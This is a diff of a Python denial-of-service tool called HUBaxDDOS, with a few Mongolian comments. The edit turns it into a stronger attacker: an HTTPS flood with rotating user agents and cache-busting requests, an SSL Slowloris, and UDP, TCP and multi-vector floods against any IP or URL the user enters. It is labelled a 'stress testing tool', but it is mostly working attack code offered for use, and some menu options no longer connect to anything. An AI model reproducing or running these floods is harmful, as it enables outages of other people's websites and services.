@@ -1,105 +1,86 @@
 #!/usr/bin/env python3
-"""
-HUBaxDDOS - Advanced Network Stress Testing Tool
-Author: n0merc
-Version: 2.0
-"""
-
 import socket
 import threading
 import random
 import time
 import sys
+import ssl
 from datetime import datetime
 from termcolor import colored
 
 # Configuration
 MAX_THREADS = 1000
 PACKET_SIZE = 4096
-TIMEOUT = 3
+TIMEOUT = 5
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/121.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
+]
 
 class HUBaxDDOS:
     def __init__(self):
         self.attack_running = False
-        self.threads = []
         self.lock = threading.Lock()
-        self.stats = {
-            'packets_sent': 0,
-            'bytes_sent': 0,
-            'start_time': None,
-            'target': None
-        }
+        self.stats = {'packets_sent': 0, 'bytes_sent': 0, 'start_time': None, 'target': None}
         
     def show_logo(self):
         logo = """
 ╔══════════════════════════════════════════════════════════╗
-║                                                          ║
 ║  ██╗  ██╗██╗   ██╗██████╗  █████╗ ██╗  ██╗██████╗ ██████╗║
 ║  ██║  ██║██║   ██║██╔══██╗██╔══██╗╚██╗██╔╝██╔══██╗██╔══██╗║
 ║  ███████║██║   ██║██████╔╝███████║ ╚███╔╝ ██║  ██║██║  ██║║
 ║  ██╔══██║██║   ██║██╔══██╗██╔══██║ ██╔██╗ ██║  ██║██║  ██║║
 ║  ██║  ██║╚██████╔╝██████╔╝██║  ██║██╔╝ ██╗██████╔╝██████╔╝║
-║  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ║
-║                                                          ║
-║                ██████╗  ██████╗   ██████╗ ███████╗       ║
-║                ██╔═══██╗██╔══██╗██╔═══██╗██╔════╝        ║
-║                ██║   ██║██║  ██║██║   ██║███████╗        ║
-║                ██║   ██║██║  ██║██║   ██║╚════██║        ║
-║                ╚██████╔╝██████╔╝╚██████╔╝███████║        ║
-║                 ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝        ║
-║                                                          ║
-║            Advanced Network Stress Testing Tool          ║
-║                   Version 2.0 - 2026                     ║
-║                                                          ║
-╚══════════════════════════════════════════════════════════╝
-        """
+╚═══════════════════════ HUBax 2.0 ════════════════════════╝"""
         print(colored(logo, 'cyan'))
         
     def show_menu(self):
         menu = """
-╔══════════════════════════════════════════════════════════╗
-║                       HUBaxDDOS MENU                     ║
-╠══════════════════════════════════════════════════════════╣
-║  [1] TCP Flood Attack      - Standard TCP connection flood║
-║  [2] UDP Flood Attack      - Connectionless UDP flood     ║
-║  [3] HTTP Flood Attack     - Layer 7 HTTP request flood   ║
-║  [4] SYN Flood Attack      - Half-open connection attack  ║
-║  [5] ICMP Flood Attack     - Ping flood attack            ║
-║  [6] Slowloris Attack      - Slow HTTP headers attack     ║
-║  [7] DNS Amplification     - DNS reflection attack        ║
-║  [8] Multi-Vector Attack   - Combine multiple methods     ║
-║  [9] Show Statistics       - Display attack stats         ║
-║  [10] Stop All Attacks     - Stop all running attacks     ║
-║  [11] Help                 - Show command instructions    ║
-║  [12] Exit                 - Exit the program             ║
-╚══════════════════════════════════════════════════════════╝
-        """
+  [1] TCP Flood         [5] ICMP Flood (UDP Sim)
+  [2] UDP Flood         [6] SSL/Slowloris (High Power)
+  [3] HTTPS Flood (443) [7] DNS Amplification
+  [4] SYN Flood         [8] Multi-Vector Attack
+  [9] Stats  [10] Stop  [11] Help  [12] Exit"""
         print(colored(menu, 'yellow'))
-
-    def generate_payload(self, size=PACKET_SIZE):
-        return random._urandom(size)
 
     def update_stats(self, packets, bytes_count):
         with self.lock:
             self.stats['packets_sent'] += packets
             self.stats['bytes_sent'] += bytes_count
 
-    def tcp_flood(self, target_ip, target_port, threads=500, duration=60):
-        print(colored(f"[+] Starting TCP Flood on {target_ip}:{target_port}", 'green'))
+    def http_flood(self, url, threads=500, duration=60):
+        print(colored(f"[+] Starting High-Power HTTPS Flood on {url}", 'green'))
+        target_host = url.replace('http://', '').replace('https://', '').split('/')[0]
         self.attack_running = True
+        
         def attack():
+            context = ssl.create_default_context()
             end_time = time.time() + duration
             while time.time() < end_time and self.attack_running:
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.settimeout(TIMEOUT)
-                    s.connect((target_ip, target_port))
-                    s.send(self.generate_payload(1024))
-                    self.update_stats(1, 1024)
-                    print(colored(f"[*] TCP Request sent to {target_ip}:{target_port}", 'blue'))
-                    s.close()
-                except:
-                    pass # Connection failed мэдэгдлийг нуув
+                    # HTTPS (443) холболт үүсгэх
+                    conn = context.wrap_socket(s, server_hostname=target_host)
+                    conn.connect((target_host, 443))
+                    
+                    user_agent = random.choice(USER_AGENTS)
+                    req = (f"GET /?{random.randint(1,99999)} HTTP/1.1\r\n"
+                           f"Host: {target_host}\r\n"
+                           f"User-Agent: {user_agent}\r\n"
+                           f"Accept: text/html,application/xhtml+xml\r\n"
+                           f"Cache-Control: no-cache\r\n"
+                           f"Connection: keep-alive\r\n\r\n").encode()
+                    
+                    conn.send(req)
+                    self.update_stats(1, len(req))
+                    print(colored(f"[*] HTTPS Request Sent to {target_host}", 'cyan'))
+                    conn.close()
+                except: pass
+
         for _ in range(threads):
             threading.Thread(target=attack, daemon=True).start()
 
@@ -107,145 +88,95 @@ class HUBaxDDOS:
         print(colored(f"[+] Starting UDP Flood on {target_ip}:{target_port}", 'green'))
         self.attack_running = True
         def attack():
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                end_time = time.time() + duration
-                while time.time() < end_time and self.attack_running:
-                    try:
-                        sock.sendto(self.generate_payload(), (target_ip, target_port))
-                        self.update_stats(1, PACKET_SIZE)
-                        print(colored(f"[*] UDP Packet sent to {target_ip}:{target_port}", 'magenta'))
-                    except: pass
-                sock.close()
-            except: pass
-        for _ in range(threads):
-            threading.Thread(target=attack, daemon=True).start()
-
-    def http_flood(self, url, threads=300, duration=60):
-        print(colored(f"[+] Starting HTTP Flood on {url}", 'green'))
-        target_host = url.replace('http://', '').replace('https://', '').split('/')[0]
-        self.attack_running = True
-        def attack():
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            payload = random._urandom(PACKET_SIZE)
             end_time = time.time() + duration
             while time.time() < end_time and self.attack_running:
                 try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.connect((target_host, 80))
-                    req = f"GET /?{random.randint(1,1000)} HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode()
-                    s.send(req)
-                    self.update_stats(1, len(req))
-                    print(colored(f"[*] HTTP GET Request sent to {target_host}", 'cyan'))
-                    s.close()
+                    sock.sendto(payload, (target_ip, target_port))
+                    self.update_stats(1, PACKET_SIZE)
+                    print(colored(f"[*] UDP Packet Sent to {target_ip}", 'magenta'))
                 except: pass
         for _ in range(threads):
             threading.Thread(target=attack, daemon=True).start()
 
-    def syn_flood(self, target_ip, target_port, threads=500, duration=60):
-        print(colored(f"[+] Starting SYN Flood on {target_ip}:{target_port}", 'green'))
-        self.attack_running = True
-        def attack():
-            end_time = time.time() + duration
-            while time.time() < end_time and self.attack_running:
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.setblocking(0)
-                    try: s.connect((target_ip, target_port))
-                    except: pass
-                    self.update_stats(1, 0)
-                    print(colored(f"[*] SYN connection attempt at {target_ip}:{target_port}", 'yellow'))
-                except: pass
-        for _ in range(threads):
-            threading.Thread(target=attack, daemon=True).start()
-
-    def slowloris(self, url, threads=200, duration=60):
-        print(colored(f"[+] Starting Slowloris on {url}", 'green'))
+    def slowloris(self, url, threads=400, duration=60):
+        print(colored(f"[+] Starting SSL Slowloris on {url}", 'green'))
         target_host = url.replace('http://', '').replace('https://', '').split('/')[0]
         self.attack_running = True
+        
         def attack():
-            end_time = time.time() + duration
+            context = ssl.create_default_context()
             sockets = []
+            end_time = time.time() + duration
             try:
-                for _ in range(threads):
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.connect((target_host, 80))
-                    s.send(f"GET /?{random.randint(1, 5000)} HTTP/1.1\r\n".encode())
-                    s.send("User-Agent: Mozilla/5.0\r\n".encode())
-                    sockets.append(s)
-                    print(colored(f"[*] Slowloris session opened for {target_host}", 'white'))
                 while time.time() < end_time and self.attack_running:
+                    if len(sockets) < threads:
+                        try:
+                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            conn = context.wrap_socket(s, server_hostname=target_host)
+                            conn.connect((target_host, 443))
+                            conn.send(f"GET /?{random.randint(1, 5000)} HTTP/1.1\r\n".encode())
+                            conn.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
+                            sockets.append(conn)
+                            print(colored(f"[*] SSL Session Opened: {target_host}", 'white'))
+                        except: pass
+                    
                     for s in sockets:
                         try:
                             s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
-                            self.update_stats(1, 0)
-                            print(colored(f"[*] Keep-alive header sent to {target_host}", 'white'))
+                            print(colored(f"[*] Keep-alive sent to {target_host}", 'blue'))
                         except: sockets.remove(s)
-                    time.sleep(15)
+                    time.sleep(10)
             except: pass
+
         threading.Thread(target=attack, daemon=True).start()
 
-    def show_stats(self):
-        if not self.stats['start_time']:
-            print(colored("[!] No active attack data.", 'red'))
-            return
-        print(colored(f"\n--- STATISTICS ---", 'cyan'))
-        print(f"Target: {self.stats['target']}")
-        print(f"Packets Sent: {self.stats['packets_sent']:,}")
-        print(f"Status: {'RUNNING' if self.attack_running else 'STOPPED'}")
+    # Бусад стандарт функцуудыг энд товчлон үлдээв (өмнөх кодоос авна)
+    def tcp_flood(self, target_ip, target_port, threads=500, duration=60):
+        self.attack_running = True
+        def attack():
+            end_time = time.time() + duration
+            while time.time() < end_time and self.attack_running:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect((target_ip, target_port))
+                    s.send(random._urandom(1024))
+                    print(colored(f"[*] TCP Sent to {target_ip}", 'blue'))
+                    s.close()
+                except: pass
+        for _ in range(threads): threading.Thread(target=attack, daemon=True).start()
 
     def stop_attack(self):
         self.attack_running = False
-        print(colored("[!] All attacks stopped.", 'red'))
+        print(colored("\n[!] Stopping all threads...", 'red'))
 
     def interactive_mode(self):
         self.show_logo()
         self.show_menu()
         while True:
             try:
-                cmd = input(colored("\nHUBaxDDOS> ", 'white')).strip().lower()
-                if cmd in ['12', 'exit']: break
-                elif cmd in ['11', 'help']: print("[!] Enter 1-8 for attacks, 9 for stats, 10 to stop.")
-                elif cmd in ['10', 'stop']: self.stop_attack()
-                elif cmd in ['9', 'stats']: self.show_stats()
-                elif cmd in ['1', 'tcp']:
-                    self.stats['target'] = input("Target IP: ")
+                cmd = input(colored("\nHUBaxDDOS> ", 'white')).strip()
+                if cmd == '12': break
+                elif cmd == '10': self.stop_attack()
+                elif cmd == '3':
+                    target = input("Target URL (example.com): ")
+                    self.stats['target'] = target
+                    self.http_flood(target)
+                elif cmd == '2':
+                    ip = input("Target IP: ")
                     port = int(input("Port: "))
-                    self.stats['start_time'] = datetime.now()
-                    self.tcp_flood(self.stats['target'], port)
-                elif cmd in ['2', 'udp']:
-                    self.stats['target'] = input("Target IP: ")
-                    port = int(input("Port: "))
-                    self.stats['start_time'] = datetime.now()
-                    self.udp_flood(self.stats['target'], port)
-                elif cmd in ['3', 'http']:
-                    self.stats['target'] = input("URL (google.com): ")
-                    self.stats['start_time'] = datetime.now()
-                    self.http_flood(self.stats['target'])
-                elif cmd in ['4', 'syn']:
-                    self.stats['target'] = input("Target IP: ")
-                    port = int(input("Port: "))
-                    self.stats['start_time'] = datetime.now()
-                    self.syn_flood(self.stats['target'], port)
-                elif cmd in ['5', 'icmp']:
-                    self.stats['target'] = input("Target IP: ")
-                    self.stats['start_time'] = datetime.now()
-                    self.udp_flood(self.stats['target'], 1) 
-                elif cmd in ['6', 'slow']:
-                    self.stats['target'] = input("URL (google.com): ")
-                    self.stats['start_time'] = datetime.now()
-                    self.slowloris(self.stats['target'])
-                elif cmd in ['7', 'dns']:
-                    self.stats['target'] = input("Target IP: ")
-                    self.stats['start_time'] = datetime.now()
-                    self.udp_flood(self.stats['target'], 53)
-                elif cmd in ['8', 'multi']:
-                    self.stats['target'] = input("Target IP: ")
-                    port = int(input("Port: "))
-                    self.stats['start_time'] = datetime.now()
-                    self.tcp_flood(self.stats['target'], port)
-                    self.udp_flood(self.stats['target'], port)
-                else: print(colored("[!] Invalid selection.", 'red'))
-            except Exception as e: print(colored(f"Error: {e}", 'red'))
+                    self.udp_flood(ip, port)
+                elif cmd == '6':
+                    target = input("Target URL (example.com): ")
+                    self.slowloris(target)
+                elif cmd == '8': # Multi-Vector
+                    ip = input("Target IP: ")
+                    self.udp_flood(ip, 443)
+                    self.tcp_flood(ip, 443)
+                else: print("Select 1-12 from menu.")
+            except KeyboardInterrupt: break
+            except Exception as e: print(f"Error: {e}")
 
 if __name__ == "__main__":
-    tool = HUBaxDDOS()
-    tool.interactive_mode()
+    HUBaxDDOS().interactive_mode()
